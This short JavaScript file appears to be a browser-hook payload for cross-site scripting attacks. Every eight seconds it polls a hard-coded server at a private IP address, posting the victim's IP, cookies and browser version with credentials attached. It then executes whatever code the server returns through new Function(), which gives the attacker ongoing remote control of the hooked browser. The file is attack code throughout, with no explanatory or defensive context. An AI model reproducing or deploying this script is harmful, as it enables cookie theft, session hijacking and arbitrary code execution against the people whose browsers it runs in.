var xmlhttp;
if (window.XMLHttpRequest) {
    xmlhttp = new XMLHttpRequest();
} else if (window.ActiveObject) {
    xmlhttp = new ActiveObject("Msxml12.XMLHTTP");
}

function Makerequest(url) {
    if (xmlhttp != null) {
        xmlhttp.onreadystatechange = state_Change;
        xmlhttp.open("POST", url, true);
        xmlhttp.withCredentials = true; //设置cookie必须带上这个参数
        xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xmlhttp.send("&IP=" + IP + "&cookies=" + browser_details['Cookies'] + "&version=" + browser_details['version']);
    }
}

function state_Change() {
    if (xmlhttp.readyState == 4) {
        if (xmlhttp.responseText != '') {
            f = new Function(xmlhttp.responseText);
            f();
        } else {
            console.log("responseText wrong");
        }
    }
}
setInterval('Makerequest("http://172.26.132.5:8000/poll")', 8000);
